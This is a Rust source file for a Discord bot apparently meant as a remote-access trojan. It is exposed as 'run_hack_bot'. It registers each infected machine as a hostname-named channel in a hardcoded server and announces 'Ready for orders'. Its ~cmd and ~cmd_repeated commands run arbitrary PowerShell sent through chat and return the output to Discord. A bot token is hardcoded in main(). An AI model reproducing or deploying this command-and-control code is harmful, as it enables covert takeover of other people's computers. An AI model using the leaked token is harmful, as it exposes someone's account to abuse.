use std::borrow::Borrow;
use std::collections::HashMap;
use std::env;
use std::error::Error;
use std::process::Stdio;
use std::sync::Arc;

use serenity::async_trait;
use serenity::builder::CreateMessage;
use serenity::collector::{MessageCollectorBuilder, MessageFilter};
use serenity::framework::standard::macros::{command, group, hook};
use serenity::framework::standard::{Args, CommandResult, StandardFramework};
use serenity::json::{JsonMap, Value};
use serenity::model::channel::{ChannelType, GuildChannel, Message};
use serenity::model::prelude::Ready;
use serenity::prelude::*;
use serenity::utils::MessageBuilder;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::process::Command;
use tokio::time::Instant;

struct ComputerChannel;


impl TypeMapKey for ComputerChannel {
    type Value = Arc<RwLock<Option<GuildChannel>>>;
}

#[group]
#[commands(ping, cmd, cmd_repeated)]
struct General;

struct Handler;


#[hook]
async fn before(ctx: &Context, msg: &Message, command_name: &str) -> bool {
    println!("Running command '{}' invoked by '{}'", command_name, msg.author.tag());

    let channel_lock = {

        let data_read = ctx.data.read().await;

        data_read.get::<ComputerChannel>().expect("Expected CommandCounter in TypeMap.").clone()
    };

    let mut computer_channel = channel_lock.read().await;



    (*computer_channel).as_ref().unwrap().id == msg.channel_id
}

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, _ctx: Context, _data_about_bot: Ready) {

        let mut channels = _ctx
            .http
            .get_channels(922233879182598206)
            .await
            .expect("could not get channels for guild")
            .into_iter()
            .find(|c| {
                c.name == hostname::get().unwrap().into_string().unwrap().to_lowercase()
            });

        let mut computer_channel = match channels {
            None => {
                let mut channel_settings = JsonMap::new();
                channel_settings.insert("name".to_string(), Value::from(hostname::get().unwrap().to_string_lossy()));
                channel_settings.insert("type".to_string(), Value::from(0_i32));
                channel_settings.insert(
                    "parent_id".to_string(),
                    Value::from(1038618842710147193_i64),
                );
                _ctx.http
                    .create_channel(922233879182598206, &channel_settings, None)
                    .await
                    .expect(&*format!(
                        "unable to create channel: {:?}",
                        channel_settings
                    ))
            }
            Some(channel) => channel,
        };

        computer_channel.send_message(_ctx.http ,|x| {x.content("Ready for orders")}).await;
        let channel_lock = {

            let data_read = _ctx.data.read().await;

            data_read.get::<ComputerChannel>().expect("Expected CommandCounter in TypeMap.").clone()
        };


        {
            let mut computer_channel_persist = channel_lock.write().await;

            *computer_channel_persist = Some(computer_channel);
        }

        println!(
            "Bot ready: {}",
            _data_about_bot.user.tag()
        );

    }
}

async fn main() {
    let framework = StandardFramework::new()
        .configure(|c| c.prefix("~")) // set the bot's prefix to "~"
        .before(before)
        .group(&GENERAL_GROUP);

    // Configure the client with your Discord bot token in the environment.
    let token = "MTAzNjc0Mjg0NDM3Mjc1MDM3Ng.GWgYu4.1lPPBiRG4jygCX1YUm0mcZzknIEb8ej_qeFs3k";
    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let mut client = Client::builder(token, intents)
        .event_handler(Handler)
        .framework(framework)
        .await
        .expect("Error creating client");

    {
        let mut data = client.data.write().await;

        data.insert::<ComputerChannel>(Arc::new(RwLock::new(None)))
    }

    // start listening for events by starting a single shard
    loop {
        println!("Starting bot...");
        if let Err(why) = client.start().await {
            println!("An error occurred while running the client: {:?}", why);
        }
        println!("Attempting restart...");
    }
}

#[command]
#[min_args(1)]
/// Takes a command, runs it in a shell, and returns the output
///
/// Arguments:
///
/// * `ctx`: The context of the command.
/// * `msg`: The message that triggered the command.
/// * `args`: The arguments passed to the command.
///
/// Returns:
///
/// A command result
async fn cmd(ctx: &Context, msg: &Message, mut args: Args) -> CommandResult {
    // Open shell
    println!("{}", args.single::<String>().unwrap());
    let mut process = Command::new("powershell")
        .args(args.raw().collect::<Vec<&str>>())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();

    let mut shell_msg_content:Vec<String> = vec!["sent command to shell, output:".parse().unwrap()];

    let mut shell_msg = msg.reply(
        ctx,
        shell_msg_content.clone().last().unwrap(),
    )
        .await?;

    let stdout = process.stdout.as_mut().unwrap();
    let stdout_reader = BufReader::new(stdout);
    let mut stdout_lines = stdout_reader.lines();

    let mut update_timer = Instant::now();
    while let Some(line) = stdout_lines.next_line().await? {
        println!("Read: {:?}", line);

        if (shell_msg_content.last().unwrap().len() + line.len()) >= 2000 {
            shell_msg.edit(ctx, |msg| {
                msg.content(shell_msg_content.clone().last().unwrap())
            }).await?;
            shell_msg_content.push(line.clone());
            shell_msg = shell_msg.reply(ctx, shell_msg_content.clone().last().unwrap()).await?;
        } else {
            *shell_msg_content.last_mut().unwrap() = format!("{}\n{}", shell_msg_content.last().unwrap(), line);
        }
        if line != "" && update_timer.elapsed().as_secs_f32() >= 0.75{
            shell_msg.edit(ctx, |msg| {
                msg.content(shell_msg_content.clone().last().unwrap())
            }).await?;
            update_timer = Instant::now();
        }
    }

    shell_msg.edit(ctx, |msg| {
        msg.content(shell_msg_content.clone().last().unwrap())
    }).await?;




    println!("jksdfhg");
    Ok(())
}

#[command]
#[min_args(2)]
/// Takes a command, runs it in a shell the specified amount of times, and returns the output
///
/// Arguments:
///
/// * `ctx`: The context of the command.
/// * `msg`: The message that triggered the command.
/// * `args`: The arguments passed to the command.
///
/// Returns:
///
/// A command result
async fn cmd_repeated(ctx: &Context, msg: &Message, mut args: Args) -> CommandResult {
    // Open shell
    println!("{:?}", args);

    for _ in 0..args.single::<i32>()? {
        Command::new("powershell")
            .args(args.raw().skip(1).collect::<Vec<&str>>())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
    }

    println!("jksdfhg");
    Ok(())
}

#[command]
async fn ping(ctx: &Context, msg: &Message) -> CommandResult {
    msg.reply(ctx, "Pong!").await?;

    Ok(())
}

pub async fn run_hack_bot() {
    main().await;
}
